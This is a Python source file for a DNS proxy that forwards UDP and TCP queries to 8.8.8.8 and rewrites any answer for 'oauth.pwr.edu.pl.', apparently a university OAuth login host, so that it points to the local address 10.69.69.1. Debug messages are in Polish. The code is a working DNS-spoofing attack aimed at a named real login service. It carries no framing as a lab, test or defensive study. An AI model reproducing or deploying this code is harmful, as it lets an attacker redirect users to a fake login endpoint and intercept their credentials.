import struct
import socket
import select

class dnsUnimplementedType(Exception):
    pass

def decodedomainstr(bytesobj, start):
    curaddr = start
    ispointer = (bytesobj[curaddr] & 0b11000000)
    if ispointer:
        pointer = bytesobj[curaddr:curaddr+2]
        pointer[0] &= 0b00111111
        realaddr = struct.unpack("!H", pointer)[0]
        domainres, domend = decodedomainstr(bytesobj, realaddr)
        return (domainres, start+2)
    domainstr = ""
    while True:
        labelsiz = struct.unpack("!B", bytesobj[curaddr:curaddr+1])[0]
        curaddr += 1
        if labelsiz == 0:
            break
        segment = bytesobj[curaddr:curaddr+labelsiz].decode("utf-8")
        domainstr += (segment + ".")
        curaddr += labelsiz
    return (domainstr, curaddr)

def decodedns(bytesobj):
    dns_bytes = bytearray(bytesobj)
    dnspack = {}
    dnspack["transaction_id"] = struct.unpack("!H", dns_bytes[0:2])[0]
    dnspack["flags"] = struct.unpack("!H", dns_bytes[2:4])[0]
    dnspack["questions_num"] = struct.unpack("!H", dns_bytes[4:6])[0]
    dnspack["answers_num"] = struct.unpack("!H", dns_bytes[6:8])[0]
    dnspack["authority_num"] = struct.unpack("!H", dns_bytes[8:10])[0]
    dnspack["additional_num"] = struct.unpack("!H", dns_bytes[10:12])[0]
    curaddr = 12
    dnspack["questions"] = []
    for questionidx in range(dnspack["questions_num"]):
        dnsquestion = {}
        dnsquestion["domainname"], curaddr = decodedomainstr(dns_bytes, curaddr)
        dnsquestion["type"] = struct.unpack("!H", dns_bytes[curaddr:curaddr+2])[0]
        curaddr += 2
        if dnsquestion["type"] != 1:
            raise dnsUnimplementedType
        dnsquestion["class"] = struct.unpack("!H", dns_bytes[curaddr:curaddr+2])[0]
        curaddr += 2
        dnspack["questions"].append(dnsquestion)

    dnspack["answers"] = []
    for answeridx in range(dnspack["answers_num"]):
        dnsanswer = {}
        dnsanswer["domainname"], curaddr = decodedomainstr(dns_bytes, curaddr)
        dnsanswer["type"] = struct.unpack("!H", dns_bytes[curaddr:curaddr+2])[0]
        curaddr += 2
        if dnsanswer["type"] != 1:
            raise dnsUnimplementedType
        dnsanswer["class"] = struct.unpack("!H", dns_bytes[curaddr:curaddr+2])[0]
        curaddr += 2
        dnsanswer["ttl"] = struct.unpack("!I", dns_bytes[curaddr:curaddr+4])[0]
        curaddr += 4
        dnsanswer["datalen"] = struct.unpack("!H", dns_bytes[curaddr:curaddr+2])[0]
        curaddr += 2
        dnsanswer["data"] = dns_bytes[curaddr: curaddr+dnsanswer["datalen"]]
        dnsanswer["dataaddr"] = curaddr
        curaddr += dnsanswer["datalen"]
        dnspack["answers"].append(dnsanswer)
    
    return dnspack

def tcpdnsrecv(conn):
    data = conn.recv(2048)
    dnslen = struct.unpack("!H", data[0:2])[0]
    while len(data) < dnslen+2:
        fragment = conn.recv(2048)
        data += fragment
    return data


def doserver():
    serveraddr = "10.69.69.1"
    #serveraddr = "127.0.0.1"
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as serversock:
        serversock.bind((serveraddr, 5399))

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcpserversock:
            tcpserversock.bind((serveraddr, 5399))
            tcpserversock.listen()

            clientsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            realdnsaddr = ("8.8.8.8", 53)

            while True:
                readable, writable, exceptional = select.select([serversock, tcpserversock],[],[])
                if serversock in readable:
                    data, addr = serversock.recvfrom(2048)
                    clientsock.sendto(data, realdnsaddr)
                    realresp, upstaddr = clientsock.recvfrom(2048)
                    moddedresp = bytearray(realresp)
                    try:
                        decodedresponse = decodedns(realresp)
                        for answer in decodedresponse["answers"]:
                            if answer["domainname"] == "oauth.pwr.edu.pl.":
                                moddedresp[answer["dataaddr"] : answer["dataaddr"]+4] = bytearray([10,69,69,1])
                                print("zastepowanie odpowiedzi")
                        print("przetworzono")
                    except dnsUnimplementedType:
                        print("blad")
                    serversock.sendto(moddedresp, addr)
                if tcpserversock in readable:
                    conn, addr = tcpserversock.accept()
                    data = tcpdnsrecv(conn)
                    clientsocktcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    clientsocktcp.connect(realdnsaddr)
                    clientsocktcp.send(data)
                    realresp = tcpdnsrecv(clientsocktcp)
                    clientsocktcp.close()
                    moddedresp = bytearray(realresp)
                    try:
                        decodedresponse = decodedns(realresp[2:])
                        for answer in decodedresponse["answers"]:
                            if answer["domainname"] == "oauth.pwr.edu.pl.":
                                moddedresp[answer["dataaddr"]+2 : answer["dataaddr"]+6] = bytearray([10,69,69,1])
                                print("zastepowanie odpowiedzi")
                        print("przetworzono")
                    except dnsUnimplementedType:
                        print("blad")
                    conn.send(moddedresp)
                    conn.close()



doserver()
